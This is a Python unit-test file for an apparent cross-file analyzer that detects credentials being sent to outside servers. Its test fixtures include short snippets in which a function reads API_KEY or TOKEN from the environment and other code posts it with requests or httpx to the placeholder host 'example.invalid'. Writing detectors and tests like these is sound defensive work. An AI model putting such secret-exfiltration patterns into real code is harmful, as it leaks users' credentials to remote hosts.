import unittest
import cross_file_review as review

class CrossFilePrototypeTests(unittest.TestCase):
    def test_direct_credential_payload_and_harmless_pair(self):
        caller='import requests\nfrom settings import read_value\nrequests.post("https://example.invalid",json={"value":read_value()})\n'
        for source,expected in [('import os\ndef read_value():\n return os.getenv("API_KEY")\n',True),('def read_value():\n return "public"\n',False),('import os\ndef read_value():\n return os.getenv("PORT")\n',False)]:
            result=review.analyze({'settings.py':source,'main.py':caller})
            self.assertEqual(bool(result['findings']),expected)
            if expected:self.assertEqual((result['findings'][0]['file'],result['findings'][0]['line'],result['findings'][0]['source_file'],result['findings'][0]['source_line']),('main.py',3,'settings.py',3))

    def test_relative_package_imports_with_harmless_and_dangerous_pair(self):
        callers=[('pkg/app.py','from .config import key'),('pkg/sub/app.py','from ..config import key'),('pkg/__init__.py','from .config import key')]
        for path,imp in callers:
            caller='import requests\n'+imp+'\nrequests.post("https://example.invalid",json=key())'
            for source,expected in [('import os\ndef key():\n return os.getenv("API_KEY")',True),('def key():\n return "public"',False)]:
                with self.subTest(path=path,expected=expected):
                    self.assertEqual(bool(review.analyze({'pkg/config.py':source,path:caller})['findings']),expected)
        self.assertFalse(review.analyze({'config.py':'import os\ndef key(): return os.getenv("API_KEY")','app.py':'import requests\nfrom .config import key\nrequests.post("https://example.invalid",json=key())'})['findings'])

    def test_unsent_getter_and_local_shadow_are_not_reported(self):
        source='import os\ndef key():\n return os.getenv("TOKEN")\n'
        for caller in ['from settings import key\nprint(key())','import requests\nfrom settings import key\nkey="public"\nrequests.post("https://example.invalid",json=key)','import requests\nfrom settings import key\ndef key(): return "public"\nrequests.post("https://example.invalid",json=key())','import requests\nfrom settings import key\nrequests.post=lambda **kwargs: None\nrequests.post(json=key())','import requests\nfrom settings import key\nrequests.post("https://example.invalid",json={"exists":bool(key())})','import requests\nfrom settings import key\nrequests.post("https://example.invalid",headers={"Authorization":key()})']:
            self.assertFalse(review.analyze({'settings.py':source,'main.py':caller})['findings'])

    def test_ambiguous_and_invalid_modules_are_not_treated_as_complete(self):
        result=review.analyze({'settings.py':'def broken(:','pkg.py':'x=1','pkg/__init__.py':'x=2'})
        self.assertEqual(result['parse_failures'],['settings.py'])
        self.assertEqual(result['ambiguous_modules'],['pkg'])
        self.assertTrue(result['limitations'])

    def test_invalid_paths_and_limits(self):
        self.assertEqual(review.module_name('../secret.py'),'')
        with self.assertRaises(ValueError):review.analyze({str(i):'x' for i in range(501)})

    def test_rebound_or_decorated_getter_does_not_create_false_evidence(self):
        caller='import requests\nfrom settings import key\nrequests.post("https://example.invalid",json=key())'
        getter='import os\ndef key():\n return os.getenv("TOKEN")\n'
        for source in [getter+'key=lambda: "public"\n', getter+'def key():\n return "public"\n', 'import os\n@replace\ndef key():\n return os.getenv("TOKEN")\n', getter+'from safe import key\n']:
            with self.subTest(source=source):
                self.assertFalse(review.analyze({'settings.py':source,'main.py':caller})['findings'])

    def test_aliases_and_credential_names_have_grounded_line_numbers(self):
        for provider in ['import os as operating\ndef read():\n return operating.getenv("OPENAI_API_KEY")', 'from os import getenv as env\ndef read():\n return env("ACCESS_TOKEN")']:
            for lib in ['requests','httpx']:
                caller=f'import {lib} as client\nfrom config import read as value\nclient.post("https://example.invalid",data={{"credential":value()}})'
                with self.subTest(provider=provider,library=lib):
                    result=review.analyze({'config.py':provider,'app.py':caller})
                    self.assertEqual(len(result['findings']),1)
                    self.assertEqual(result['findings'][0]['line'],3)

    def test_getters_with_parameters_async_or_nonsecret_names_are_not_inferred(self):
        caller='import requests\nfrom config import read\nrequests.post("https://example.invalid",json=read())'
        for provider in ['import os\ndef read(required):\n return os.getenv("API_KEY")','import os\nasync def read():\n return os.getenv("API_KEY")','import os\nos.environ["API_KEY"]="public"\ndef read():\n return os.getenv("API_KEY")','import os\ndef read():\n return os.getenv("TOKENIZER_MODE")','import os\ndef read():\n return os.getenv("MONKEY_COUNT")']:
            with self.subTest(provider=provider):
                self.assertFalse(review.analyze({'config.py':provider,'app.py':caller})['findings'])
